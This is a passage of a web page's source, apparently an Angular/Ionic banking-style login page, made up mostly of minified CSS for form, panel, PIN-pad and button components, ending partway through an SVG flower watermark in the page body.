fbr-field-input-static .section-title .form-control-label-text{font:var(--fho-font-title-h3);color:var(--fho-color-blue)}[_nghost-ng-c818687559]     .form-template fho-page-container-template-row fho-page-container-template-col fbr-field-input-static .form-control-label{padding:0}[_nghost-ng-c818687559]     .form-template fho-page-container-template-row fho-page-container-template-col fbr-field-input-static .form-control-label .form-control-label-text{margin:1px 6px 1px 1px}@media screen and (max-width: 767px){{%BLOCK%}}[_nghost-ng-c818687559]     .form-template fho-page-container-template-row fho-page-container-template-col .small-col fbr-field-input-switch{height:48px;display:flex;align-items:center;justify-content:end}[_nghost-ng-c818687559]     .form-template fho-page-container-template-row fho-page-container-template-col .small-col fbr-field-input-switch .form-group{margin:unset!important}[_nghost-ng-c818687559]     .fho-page-container fho-cover .tabview-container>div>fbr-button{bottom:auto;top:54px}[_ngcontent-ng-c818687559]:is()   ion-row[_ngcontent-ng-c818687559]{align-items:center}@media screen and (min-width: 1200px){[_nghost-ng-c818687559]     fbr-search-result-table.annex-table .p-datatable-header>div.filter-input>div.inline-flex{margin-left:auto}}@media screen and (max-width: 1199px){[_nghost-ng-c818687559]     .fho-page-container fho-cover .tabview-container>div>fbr-button{bottom:auto;top:70px}}@media screen and (min-width: 768px){[_nghost-ng-c818687559]     fbr-search-result-table.annex-table .p-datatable-header>div.filter-input{padding:0 0 20px}}@media screen and (max-width: 767px){[_nghost-ng-c818687559]     .form-template, [_nghost-ng-c818687559]     .tables-template, [_nghost-ng-c818687559]     .table-template{margin-top:0!important;margin-bottom:0!important}[_nghost-ng-c818687559]     .p-panel .panel-content fho-page-container-template-row>ion-row{padding-bottom:40px!important}[_nghost-ng-c818687559]     .block-img-badge ion-img::part(image){width:120px;height:120px;margin:auto;display:block}[_nghost-ng-c818687559]     .p-panel .panel-content fho-page-container-template-row>ion-row:has(fbr-validator-message div){padding-bottom:17px!important}[_nghost-ng-c818687559]     .fho-page-container fho-cover{padding-top:96px}[_nghost-ng-c818687559]     .fho-page-container fho-cover .tabview-container .custom-container{margin-bottom:0}[_nghost-ng-c818687559]     .fho-page-container fho-cover .tabview-container .custom-container fho-tabView p-tabView .p-tabview-nav li{padding:0 10px}[_nghost-ng-c818687559]     .form-template fbr-form-button .form-actions{padding-bottom:16px}[_nghost-ng-c818687559]     fbr-panel .no-title .collapsible-septary-panel-wrapper .p-toggleable-content .panel-content>ion-grid>ion-row{padding-bottom:20px!important}[_nghost-ng-c818687559]     fbr-panel .no-title .collapsible-septary-panel-wrapper .p-toggleable-content .panel-content>ion-grid>ion-row>ion-col.input-button-container{padding-bottom:0!important}[_nghost-ng-c818687559]     .tables-template fbr-panel .collapsible-tertiary-panel-wrapper .p-panel .p-panel-content, [_nghost-ng-c818687559]     .table-template fbr-panel .collapsible-tertiary-panel-wrapper .p-panel .p-panel-content{padding:24px 16px!important}[_nghost-ng-c818687559]     .tables-template fbr-search-result-table .p-datatable-header>div.filter-input div.add-button, [_nghost-ng-c818687559]     .tables-template fbr-search-result-table .p-datatable-header>div.filter-input fbr-form-button, [_nghost-ng-c818687559]     .table-template fbr-search-result-table .p-datatable-header>div.filter-input div.add-button, [_nghost-ng-c818687559]     .table-template fbr-search-result-table .p-datatable-header>div.filter-input fbr-form-button{width:100%!important}[_nghost-ng-c818687559]     .tables-template fbr-search-result-table .p-datatable-header>div.filter-input fbr-form-button>div, [_nghost-ng-c818687559]     .table-template fbr-search-result-table .p-datatable-header>div.filter-input fbr-form-button>div{flex-direction:column-reverse;gap:20px}[_nghost-ng-c818687559]     .tables-template fbr-search-result-table .p-datatable-header>div.filter-input, [_nghost-ng-c818687559]     .table-template fbr-search-result-table .p-datatable-header>div.filter-input{flex-direction:column-reverse;padding-bottom:12px;gap:16px}[_nghost-ng-c818687559]     .fho-page-container fho-cover .tabview-container>div>fbr-button{top:90px}[_nghost-ng-c818687559]     .tables-template fbr-search-result-table .p-datatable-header>div.filter-input fbr-form-button fbr-button button, [_nghost-ng-c818687559]     .table-template fbr-search-result-table .p-datatable-header>div.filter-input fbr-form-button fbr-button button{width:100%!important}[_nghost-ng-c818687559]     .tables-template fbr-field-input-static .section-title .form-control-label-text{font:var(--fho-font-title-h3)}[_nghost-ng-c818687559]     .form-template-top-section, [_nghost-ng-c818687559]     .table-template-top-section{flex-wrap:wrap}[_nghost-ng-c818687559]     .form-template-top-section>ion-col~ion-col, [_nghost-ng-c818687559]     .table-template-top-section>ion-col~ion-col{justify-content:center!important}[_nghost-ng-c818687559]     .table-template-top-section>ion-col:empty{max-width:0}[_nghost-ng-c818687559]     .form-template-top-section .action-button-type-shortcut .action-button-type-shortcut-more-button button, [_nghost-ng-c818687559]     .table-template-top-section .action-button-type-shortcut .action-button-type-shortcut-more-button button{display:block!important}}@media screen and (max-width: 767px){[_nghost-ng-c818687559]     .p-panel.p-component{max-width:334px;min-width:334px!important;padding:32px 16px}[_nghost-ng-c818687559]     fbr-panel .collapsible-septary-panel-wrapper .p-panel .p-panel-content{padding:20px 20px 10px!important;min-width:unset!important}[_nghost-ng-c818687559]     fbr-panel .collapsible-septary-panel-wrapper .p-panel .p-panel-content .input-button-container{padding-bottom:24px;padding-top:14px}[_nghost-ng-c818687559]     fbr-field-select-or-radio-button .p-selectbutton{min-width:185px}[_nghost-ng-c818687559]     fbr-field-select-or-radio-button .p-selectbutton .p-button.p-element{flex-basis:content!important}[_nghost-ng-c818687559]     .page-disclaimer{align-items:center;padding-left:0}[_nghost-ng-c818687559]     .cookies ion-icon{display:flex;justify-content:center;align-self:center;align-items:center;padding:auto}[_nghost-ng-c818687559]     .cookies a{font:var(--fho-font-M-semibold);color:var(--fho-color-white);text-transform:uppercase;max-width:167px;min-width:167px;word-wrap:break-word;display:unset;white-space:normal}[_nghost-ng-c818687559]     fbr-button .btn-square div span{font:var(--fho-font-M-semibold);color:var(--fho-color-white);text-transform:uppercase;max-width:145px;min-width:145px;word-wrap:break-word;display:unset;white-space:normal}}@media screen and (min-width: 768px) and (max-width: 1199px){[_nghost-ng-c818687559]     .p-panel.p-component{max-width:680px;min-width:398px}[_nghost-ng-c818687559]     .p-component.p-panel-toggleable{min-width:398px}[_nghost-ng-c818687559]     .page-disclaimer{padding-left:36px}[_nghost-ng-c818687559]     fbr-panel .collapsible-septary-panel-wrapper .p-panel .p-panel-content{min-width:unset!important}}@media screen and (min-width: 1200px){[_nghost-ng-c818687559]     .fho-page-container>ion-grid:last-child{margin-left:auto;margin-right:auto;width:90vw}[_nghost-ng-c818687559]     fbr-panel .collapsible-septary-panel-wrapper .p-panel .p-panel-content{min-width:unset!important}[_nghost-ng-c818687559]     .pin-update{margin-left:auto;margin-right:auto}}[_nghost-ng-c818687559]     .panel-content fho-page-container-template-row>ion-row{padding-bottom:32px!important;align-items:unset}[_nghost-ng-c818687559]     .empty-message{margin:0 0 20px!important}[_nghost-ng-c818687559]     .input[type=file].ngx-extended-pdf-viewer-file-input{display:none!important}[_nghost-ng-c818687559]     .form-group{margin:auto}[_ngcontent-ng-c818687559]:is()   .empty-message[_ngcontent-ng-c818687559]{margin-bottom:30px}@media screen and (min-width: 768px){{%BLOCK%}}@media screen and (min-width: 768px){[_nghost-ng-c818687559]     .form-group.form-group-static-elements{min-height:100%!important}}[_nghost-ng-c818687559]     .panel-content fho-page-container-template-row>ion-row:has(fbr-validator-message div){padding-bottom:9px!important}[_nghost-ng-c818687559]     .panel-content ion-grid>fho-page-container-template-row:last-child>ion-row{padding-bottom:0}[_nghost-ng-c818687559]     .tables-template>ion-row>ion-col>fbr-panel>ion-grid fho-page-container-template-row:nth-child(2)>ion-row, [_nghost-ng-c818687559]     .table-template>ion-row>ion-col>fbr-panel>ion-grid fho-page-container-template-row:nth-child(2)>ion-row{padding-top:15px}[_nghost-ng-c818687559]     fbr-search-result-table .add-button fbr-form-button .group-buttons-expanded fbr-button:first-child{margin-right:0!important}@media screen and (max-width: 1199px){[_nghost-ng-c818687559]     #button-transparent{display:none}}[_nghost-ng-c818687559]     #button-transparent{cursor:default}[_nghost-ng-c818687559]     .theme-dark-connection ion-grid.pin-update fho-pin-pad{background:var(--fho-color-grey2);padding:0 64px}[_nghost-ng-c818687559]     .theme-dark-connection .pin-update ion-col.right-content .block-authentification{background:var(--fho-color-grey2)}[_nghost-ng-c818687559]     ion-grid.pin-update{padding-top:0!important}[_nghost-ng-c818687559]     fho-sms-validation-input ion-grid ion-row:first-child{display:unset!important}[_nghost-ng-c818687559]     .pin-update fho-sms-validation-input ion-grid{background:var(--fho-color-white)!important}[_nghost-ng-c818687559]     ion-grid.pin-update fho-pin-pad{background:var(--fho-color-white);padding:47px 64px}[_nghost-ng-c818687559]     .pin-update .general-grid{max-width:300px}[_nghost-ng-c818687559]     .pin-update ion-col.right-content .block-authentification{min-width:428px}[_nghost-ng-c818687559]     .pin-update ion-col.left-content{display:flex;justify-content:center}[_nghost-ng-c818687559]     .pin-update ion-col.left-content span{max-width:428px}@media screen and (min-width: 768px) and (max-width: 1199px){[_nghost-ng-c818687559]     ion-grid.pin-update{margin:0 auto!important;padding-left:40px;padding-right:40px}[_nghost-ng-c818687559]     ion-grid.pin-update ion-row ion-col.left-content{padding-top:0}[_nghost-ng-c818687559]     ion-grid.pin-update ion-row ion-col.right-content{padding-top:0}}@media screen and (max-width: 767px){[_nghost-ng-c818687559]     .pin-update>ion-row:not(:has(.center-content)){flex-direction:column}[_nghost-ng-c818687559]     .pin-update ion-col.right-content .block-authentification{min-width:335px}[_nghost-ng-c818687559]     ion-grid.pin-update fho-pin-pad{padding:29px 64px}}[_nghost-ng-c818687559]     .left-content{font:var(--fho-font-L-reg)}[_nghost-ng-c818687559]     .pin-update .left-content{color:var(--fho-color-blue-80)}[_nghost-ng-c818687559]     .pin-update .left-content ul li{color:var(--fho-color-blue-80)}[_nghost-ng-c818687559]     .left-content ion-grid.pin-title-messages{margin-top:25px;padding-top:0;max-width:508px}[_nghost-ng-c818687559]     .left-content ion-grid.pin-title-messages>ion-row:first-child>ion-col:first-child{padding-top:0}[_nghost-ng-c818687559]     .center-content{padding-left:72px;padding-right:72px;display:flex;justify-content:center}[_nghost-ng-c818687559]     .right-content{padding-left:0!important;padding-right:0!important;display:flex;justify-content:flex-end}[_nghost-ng-c818687559]     .pin-update .right-content{justify-content:space-around}[_nghost-ng-c818687559]     ion-col.right-content .block-authentification{padding:48px 64px;background:var(--fho-color-grey2);border-radius:6px;position:relative;min-width:335px;max-width:428px;max-height:604px}[_nghost-ng-c818687559]     .pin-update ion-col.right-content .block-authentification{background:var(--fho-color-white)}[_nghost-ng-c818687559]     ion-col.right-content .block-authentification fbr-button.previous-button{position:absolute;left:16px;top:34px}[_nghost-ng-c818687559]     ion-col.right-content .block-authentification fbr-button.previous-button button{width:24px;height:24px}[_nghost-ng-c818687559]     ion-col.right-content .block-authentification fbr-button.previous-button button div span{font-size:24px;font-weight:400}[_nghost-ng-c818687559]     ion-col.right-content .shadow-effect{box-shadow:-23px -23px 115px #00000014,28px 28px 50px #0000003d,-32px -32px 40px #0a0a0a0a,16px 16px 20px #cdcdcd14}@media screen and (max-width: 767px){[_nghost-ng-c818687559]     ion-grid.pin-update{padding-top:0!important;padding-left:0!important;padding-right:0!important}[_nghost-ng-c818687559]     .left-content ion-grid.pin-title-messages ion-row ion-col{margin-top:unset;padding-left:0;padding-right:0}[_nghost-ng-c818687559]     ion-col.right-content .block-authentification{background:var(--fho-color-grey2);padding:32px 16px;margin-left:auto;margin-right:auto}[_nghost-ng-c818687559]     ion-col.right-content .block-authentification fbr-button.previous-button{top:19px}[_nghost-ng-c818687559]     .left-content{padding-left:20px;padding-right:20px}[_nghost-ng-c818687559]     .right-content{padding-top:24px;padding-left:20px!important;padding-right:20px!important;justify-content:center}}@media screen and (max-width: 768px){[_nghost-ng-c818687559]     ion-col.right-content .block-authentification{width:398px!important}}@media screen and (max-width: 1199px){[_nghost-ng-c818687559]     .left-content ion-grid.pin-title-messages{margin-top:-15px;margin-left:0!important}}@media screen and (max-width: 767px){[_nghost-ng-c818687559]     .left-content ion-grid.pin-title-messages{margin-top:-20px!important}}[_nghost-ng-c818687559]     .banner{display:flex;background:var(--fho-color-white)}[_nghost-ng-c818687559]     .banner ion-col{display:flex;height:50px}[_nghost-ng-c818687559]     .right-content .align-left{position:absolute;left:14px!important;top:64px!important;transform:translateY(-50%);background:none}[_nghost-ng-c818687559]     ul li{list-style-type:disc;color:var(--fho-color-indigo-40)}[_nghost-ng-c818687559]     span ul{padding-left:28px}[_nghost-ng-c818687559]     ul{margin:5px 0 0 30px}[_nghost-ng-c818687559]     .p-autocomplete-items{margin:5px 0 0!important}[_nghost-ng-c818687559]     .right-content .select-language p-selectbutton>.p-selectbutton>.p-button{padding:5px}[_nghost-ng-c818687559]     .right-content .select-language-container{position:sticky}[_nghost-ng-c818687559]     .hello-title{font:var(--fho-font-title-h1);color:var(--fho-color-indigo-40)}[_nghost-ng-c818687559]     .client-title{font:var(--fho-font-title-h1);color:var(--fho-color-white);text-transform:capitalize;margin-left:15px}[_nghost-ng-c818687559]     .title-container{margin-bottom:22px}[_nghost-ng-c818687559]     .spacing-bottom{margin-bottom:10px}[_nghost-ng-c818687559]     .message-white-bold{font:var(--fho-font-L-reg);color:var(--fho-color-white)}[_nghost-ng-c818687559]     .message-white{font:var(--fho-font-L-reg);color:var(--fho-color-white)}[_nghost-ng-c818687559]     .message-indigo{font:var(--fho-font-L-reg);color:var(--fho-color-indigo-40)}[_nghost-ng-c818687559]     .message-indigo-bold{font:var(--rmm-font-L-bold);color:var(--fho-color-indigo-40)}[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div{display:flex;flex-direction:column}[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div>div.container-fluid{display:flex;padding:0;margin:40px 0 21px 58px}[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div>div.container-fluid>.header-content>.inner-content{padding:0}[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div>ion-grid.form-template{display:flex;justify-content:center;margin:0;flex:unset}[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div>ion-grid.form-template>ion-row{width:100%}[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div>ion-grid.pin-update{margin:0}[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div>ion-grid:last-child{display:flex;align-items:flex-end;padding:0;margin:25px 0 40px 58px;flex:1}[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div>ion-grid:last-child>ion-row>ion-col{padding:0}@media screen and (max-width: 1200px){[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div>div.container-fluid{justify-content:center;margin-left:0;margin-top:40px;margin-bottom:32px}[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div>div.container-fluid>.header-content>.inner-content{padding-top:0!important}[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div>ion-grid:last-child{margin-left:0;justify-content:center;margin-bottom:40px;margin-top:36px}[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div>ion-grid:last-child>ion-row>.page-disclaimer{padding:0}[_nghost-ng-c818687559]   fho-page-container[_ngcontent-ng-c818687559] >.fho-page-container>div>ion-grid:last-child>ion-row>.page-disclaimer>div{margin-top:31px}}</style><style>[_nghost-ng-c400102224]     .btn-wrapper-header{font-size:12px;font-weight:400}[_nghost-ng-c400102224]     .btn-wrapper-header-sm{font-size:11px;font-weight:400}[_nghost-ng-c400102224]   .locked.btn[_ngcontent-ng-c400102224]{padding:7px 0 8px}[_nghost-ng-c400102224]     .underline .p-element{text-decoration-line:underline!important}[_nghost-ng-c400102224]   .btn-link.previous-button[_ngcontent-ng-c400102224]{text-decoration:none}[_nghost-ng-c400102224]   .btn-link.previous-button[_ngcontent-ng-c400102224]   .custom-icon-arrow-line-left[_ngcontent-ng-c400102224]:before{vertical-align:bottom}[_nghost-ng-c400102224]   button.btn.primary-button[_ngcontent-ng-c400102224]{background-color:var(--fbr-button-background-primary)}[_nghost-ng-c400102224]   button.btn.primary-button[_ngcontent-ng-c400102224]   div[_ngcontent-ng-c400102224]   span[_ngcontent-ng-c400102224], [_nghost-ng-c400102224]   button.btn.primary-button[_ngcontent-ng-c400102224]   ion-icon[_ngcontent-ng-c400102224]{color:var(--fbr-button-color-primary);white-space:unset}[_nghost-ng-c400102224]   button.btn.primary-button[_ngcontent-ng-c400102224]:active, [_nghost-ng-c400102224]   button.btn.primary-button[_ngcontent-ng-c400102224]:hover{background-color:var(--fbr-button-background-hover-primary)}[_nghost-ng-c400102224]   button.btn[disabled].primary-button[_ngcontent-ng-c400102224]{background-color:var(--fbr-button-background-disabled-primary)}[_nghost-ng-c400102224]   button.btn[disabled].primary-button[_ngcontent-ng-c400102224]   div[_ngcontent-ng-c400102224]   span[_ngcontent-ng-c400102224], [_nghost-ng-c400102224]   button.btn[disabled].primary-button[_ngcontent-ng-c400102224]   ion-icon[_ngcontent-ng-c400102224]{color:var(--fbr-button-color-disabled-primary)}[_nghost-ng-c400102224]   button.btn.secondary-button[_ngcontent-ng-c400102224]{background-color:var(--fbr-button-background-secondary)}[_nghost-ng-c400102224]   button.btn.secondary-button[_ngcontent-ng-c400102224]   div[_ngcontent-ng-c400102224]   span[_ngcontent-ng-c400102224], [_nghost-ng-c400102224]   button.btn.secondary-button[_ngcontent-ng-c400102224]   ion-icon[_ngcontent-ng-c400102224]{color:var(--fbr-button-color-secondary)}[_nghost-ng-c400102224]   button.btn.secondary-button[_ngcontent-ng-c400102224]:active, [_nghost-ng-c400102224]   button.btn.secondary-button[_ngcontent-ng-c400102224]:hover{background-color:var(--fbr-button-background-hover-secondary)}[_nghost-ng-c400102224]   button.btn[disabled].secondary-button[_ngcontent-ng-c400102224]{background-color:var(--fbr-button-background-disabled-secondary)}[_nghost-ng-c400102224]   button.btn[disabled].secondary-button[_ngcontent-ng-c400102224]   div[_ngcontent-ng-c400102224]   span[_ngcontent-ng-c400102224], [_nghost-ng-c400102224]   button.btn[disabled].secondary-button[_ngcontent-ng-c400102224]   ion-icon[_ngcontent-ng-c400102224]{color:var(--fbr-button-color-disabled-secondary)}</style><style>@layer primeng{.p-toast{position:fixed;width:25rem}.p-toast-message{overflow:hidden}.p-toast-message-content{display:flex;align-items:flex-start}.p-toast-message-text{flex:1 1 auto}.p-toast-top-right{top:20px;right:20px}.p-toast-top-left{top:20px;left:20px}.p-toast-bottom-left{bottom:20px;left:20px}.p-toast-bottom-right{bottom:20px;right:20px}.p-toast-top-center{top:20px;left:50%;transform:translate(-50%)}.p-toast-bottom-center{bottom:20px;left:50%;transform:translate(-50%)}.p-toast-center{left:50%;top:50%;min-width:20vw;transform:translate(-50%,-50%)}.p-toast-icon-close{display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;flex:none}.p-toast-icon-close.p-link{cursor:pointer}}
+</style><style>.fullWidthAlignRight[_ngcontent-ng-c1098984121]{width:100%;right:10px}.fullWidthAlignLeft[_ngcontent-ng-c1098984121]{width:100%;left:10px}</style><style>[_ngcontent-ng-c98900857]:root{--primaryActionTextColor: #444;--scrollbarWidth: 7px;--scrollbarTrackWidth: 0px;--scrollbarThumbWidth: 4px;--fbr-color-red-error-message: #dd0909;--fbr-color-light-panel-header: #eaeaec;--fbr-color-main-dark: #22222d;--fbr-color-success-application: #20a924;--fbr-color-secondary-action: #005497;--fbr-color-primary-action-hover: #4c8e0c;--fbr-color-primary-action: #66c010;--fbr-color-dark-main-background: #f5f6f8;--fbr-color-table-header: #ebedf0;--fbr-color-carousel-light-background: #f1f2f5;--fbr-color-header-icon: #dee2ea;--fbr-color-link-action: #9b9b9b;--fbr-color-list-font-color: #b3bac7;--fbr-color-dashboard-hover: #005497;--fbr-color-notification-badge: #ff586d;--fbr-color-right-panel-font: #333448;--fbr-font-family: "Work Sans", sans-serif;--fbr-color-header-wrapper: #22222d;--fbr-color-slider-range: #22222d;--fbr-color-slider-line: #22222d}  .ui-helper-clearfix .p-button.p-component{background-color:var(--fbr-color-primary-action)}fbr-blockable-div[_ngcontent-ng-c98900857]{display:block;position:relative}.blocked[_ngcontent-ng-c98900857]     .p-panel .p-panel-header-icon{margin-top:-24px!important;margin-right:0}.blocked[_ngcontent-ng-c98900857]     .p-panel-header .pi-plus{font-size:2em}.blocked[_ngcontent-ng-c98900857]     .p-panel-header .pi-plus:before{content:"\f023";font-family:FontAwesome!important}.no-title[_ngcontent-ng-c98900857]     .title .p-panel.p-component .p-panel-header, .title[_ngcontent-ng-c98900857]     .p-panel.p-component .p-panel-header{display:inherit}.no-title[_ngcontent-ng-c98900857]     .p-panel.p-component .p-panel-header{display:none}.no-title[_ngcontent-ng-c98900857]   .form-section-content[_ngcontent-ng-c98900857]{border:none;padding:var(--fbr-panel-form-section-content-top-padding) 0 var(--fbr-panel-form-section-content-bottom-padding)}  .ui-helper-clearfix .btn.btn-sm{margin:-5px 0}  .ui-helper-clearfix-header{display:flex!important}  .p-component .panel-content button.btn-wrapper-header-sm{font-size:12px}  .ui-helper-clearfix-header .panel-summary-info{white-space:nowrap;text-overflow:ellipsis;overflow:hidden;padding-right:25px}  .panel-title-on-collapse-infos{font-style:italic;font-size:12px}  .panel-title-infos{float:right;margin-left:auto}.collapsible-secondary-panel-wrapper[_ngcontent-ng-c98900857]   .panel-content[_ngcontent-ng-c98900857]{padding:10px 0 0}.collapsible-secondary-panel-wrapper[_ngcontent-ng-c98900857]     .ui-state-default{border:none}.blocked[_ngcontent-ng-c98900857]     .collapsible-secondary-panel-wrapper .p-panel-header .fa-plus:before{vertical-align:text-top!important;font-size:23px!important}.collapsible-secondary-panel-wrapper[_ngcontent-ng-c98900857]     .boxed-grid-row{margin:0}  .p-panel .p-button:enabled:hover{border:none}  p-header div{max-height:24px}  p-header div span{white-space:nowrap}  p-header .p-panel-title{max-width:1260px;order:unset}  p-header div button.p-splitbutton-menubutton{vertical-align:top}  p-header div div.p-tieredmenu-dynamic{max-height:none}  p-header fbr-action-button{min-width:150px}  p-header .btn-link{padding:0;margin-top:2px}  p-header fbr-action-button+fbr-button .btn-link{margin-left:-37px}.collapsible-file-panel-wrapper[_ngcontent-ng-c98900857]     .p-panel .p-panel-header-icon.p-panel-header-toggler .pi-minus:before, .collapsible-file-panel-wrapper[_ngcontent-ng-c98900857]     .p-panel .p-panel-header-icon.p-panel-header-toggler .pi-plus:before{background:#000!important}  .p-panel .p-panel-content{border:none}  .p-panel-icons{position:absolute;display:inline-block;right:5px;top:14px}  .p-panel>.p-panel-header>.p-panel-icons>.p-panel-header-icon{margin-top:0!important}  .p-panel-icons>.p-panel-header-icon>ion-icon{font-size:19px}  .p-panel-icons .pi{font-size:12px}[_nghost-ng-c98900857]     p-header{font-size:12px;line-height:16px;font-family:var(--fbr-font-family);color:#000}[_nghost-ng-c98900857]   .collapsible-secondary-panel-wrapper[_ngcontent-ng-c98900857]     .p-panel-header .pi-minus, [_nghost-ng-c98900857]   .collapsible-secondary-panel-wrapper[_ngcontent-ng-c98900857]     .p-panel-header .pi-plus, [_nghost-ng-c98900857]   .collapsible-secondary-panel-wrapper[_ngcontent-ng-c98900857]     .p-panel-header .pi-minus:before, [_nghost-ng-c98900857]   .collapsible-secondary-panel-wrapper[_ngcontent-ng-c98900857]     .p-panel-header .pi-plus:before{background:#fff!important}[_nghost-ng-c98900857]   .collapsible-secondary-panel-wrapper[_ngcontent-ng-c98900857]     .p-panel .p-panel-header .p-panel-icons{margin-right:20px}[_nghost-ng-c98900857]     .p-component.p-panel-toggleable{background:#fff!important}[_nghost-ng-c98900857]     .p-panel .p-panel-header .p-panel-header-icon:focus{box-shadow:none}  .p-panel.p-component{padding:0!important}[_nghost-ng-c98900857]     .form-section>div>p-panel>.p-panel>.p-toggleable-content.ng-animating{overflow:hidden}[_nghost-ng-c98900857]     .form-section>div>p-panel>.p-panel.p-panel-expanded>.p-toggleable-content:not(.ng-animating){overflow:visible}[_nghost-ng-c98900857]     .form-section>div>p-panel>.p-panel>.p-toggleable-content .p-toggleable-content{overflow:hidden}[_nghost-ng-c98900857]     .collapsible-file-panel-wrapper>p-panel>.p-panel>.p-toggleable-content>.p-panel-content{border-bottom-left-radius:var(--fbr-border-radius);border-bottom-right-radius:var(--fbr-border-radius)}[_nghost-ng-c98900857]     .collapsible-file-panel-wrapper>p-panel>.p-panel>.p-panel-header{background-color:var(--fbr-color-main-dark)!important;border-top-left-radius:var(--fbr-border-radius);border-top-right-radius:var(--fbr-border-radius)}</style><style>.form-action-margin-bottom[_ngcontent-ng-c154291738]{margin-bottom:20px}.form-action-margin-top[_ngcontent-ng-c154291738]{margin-top:20px}.modal-buttons[_ngcontent-ng-c154291738]{padding:15px 0 0;border-top:1px solid #e0e0e1}</style><style>[_nghost-ng-c2567436200]     .p-tooltip{position:absolute!important;right:0!important;bottom:0!important;top:initial!important;left:initial!important;margin-bottom:50px!important;min-width:150px!important}[_nghost-ng-c2567436200]     .p-tooltip-top .p-tooltip-arrow{margin-left:20px!important}</style><style>@layer primeng{.p-panel-header{display:flex;align-items:center}.p-panel-title{line-height:1;order:1}.p-panel-header-icon{display:inline-flex;justify-content:center;align-items:center;cursor:pointer;text-decoration:none;overflow:hidden;position:relative}.p-panel-toggleable.p-panel-expanded>.p-toggleable-content:not(.ng-animating){overflow:visible}.p-panel-toggleable .p-toggleable-content{overflow:hidden}}
+</style><style>.p-blockui{position:absolute;top:0;left:0;width:100%;height:100%;background-color:transparent;transition-property:background-color;display:flex;align-items:center;justify-content:center}.p-blockui.p-component-overlay{position:absolute}.p-blockui-document.p-component-overlay{position:fixed}.p-blockui-leave.p-component-overlay{background-color:transparent}.p-component-overlay-enter{animation:p-component-overlay-enter-animation .15s forwards}.p-component-overlay-leave{animation:p-component-overlay-leave-animation .15s forwards}@keyframes p-component-overlay-enter-animation{0%{background-color:transparent}to{background-color:#0006}}@keyframes p-component-overlay-leave-animation{0%{background-color:#0006}to{background-color:transparent}}
+</style><style>.form-group-stack.next-child-gap[_ngcontent-ng-c71584862]{margin-left:15px}[_nghost-ng-c71584862]     span.form-control-label-icon{height:auto;width:auto;padding:3px 10px;line-height:15px;font-weight:500;font-size:10px;cursor:pointer}[_nghost-ng-c71584862]     span.form-control-label-icon i{margin-right:5px}[_nghost-ng-c71584862]     label.form-control-label{width:100%}[_nghost-ng-c71584862]     span.form-control-static{word-break:break-word;white-space:pre-line}[_nghost-ng-c71584862]     span.form-control-label-text{word-break:break-word;white-space:pre-line}[_nghost-ng-c71584862]     span.custom-icon{padding-left:6px;color:#000;z-index:3}.no-overflow[_nghost-ng-c71584862]   .form-control-static[_ngcontent-ng-c71584862]{word-break:break-word}[_nghost-ng-c71584862]     .modal-complementary-information{margin-top:0!important}</style></head>
+  <body class="fhome mat-typography">
+    <app-root ng-version="18.2.13"><div class="btbnc-bt"><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><app-login _nghost-ng-c2137753118="" class="ng-star-inserted"><fho-page-container-template-connection _ngcontent-ng-c2137753118="" _nghost-ng-c818687559=""><fho-page-container _ngcontent-ng-c818687559=""><div class="fho-page-container theme-dark-connection" style="position:relative;overflow:hidden;">
+<svg id="flower-watermark" width="660" height="660" viewBox="0 0 660 660" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M418.957 444.05C438.658 493.455 460.842 599.107 411.587 643.399C388.351 664.379 346.767 666.559 319.32 636.104C293.677 607.604 300.821 543.311 297.212 516.465C289.842 528.497 278.638 543.16 257.959 561.809C226.15 590.459 159.525 606.928 132.003 576.473C119.595 562.711 110.797 548.8 112.677 533.309C115.459 511.051 154.411 469.316 176.67 437.583C120.873 461.195 44.6982 477.212 16.7998 446.23C-4.25549 422.844 -7.03781 391.787 17.1758 369.98C45.2245 344.714 114.782 333.584 157.043 323.809C126.814 316.364 74.6268 261.395 54.8498 239.512C23.7932 205.072 23.9436 147.094 54.549 119.497C78.8379 97.539 174.94 182.738 242.618 229.36C211.637 194.995 218.179 43.9231 251.341 14.0696C269.765 -2.47388 295.933 -4.65461 308.04 8.73056C343.157 47.7581 334.811 132.957 345.338 169.278C359.927 145.59 386.998 104.156 420.235 74.1525C453.548 44.1486 504.08 10.9113 537.393 47.9085C577.774 92.7263 528.219 164.69 455.578 231.917C532.43 192.89 611.538 213.193 641.617 246.581C665.229 272.749 666.958 287.939 641.767 310.574C615.448 334.261 525.436 340.879 478.212 333.96C500.396 340.954 561.155 388.93 584.617 415.023C601.311 433.522 621.464 484.28 596.724 506.539C554.463 544.664 433.771 446.531 418.881 444.125L418.957 444.05ZM414.445 427.431C480.919 459.691 564.013 511.126 581.083 495.786C589.43 488.266 580.631 456.533 551.831 424.573C523.03 392.615 465.053 335.314 409.256 334.111C406.549 330.2 404.669 326.365 406.098 322.681C438.207 315.988 593.415 332.456 624.472 304.483C645.452 285.533 637.932 273.577 621.614 255.529C598.529 229.887 485.883 216.727 433.395 264.102C422.04 274.329 420.16 277.487 409.106 289.97C402.639 286.285 396.924 280.796 401.586 273.727C429.334 231.692 565.818 114.308 522.955 66.8583C501.373 42.8703 474.904 58.9626 440.99 89.4928C407.301 119.873 362.709 162.66 354.512 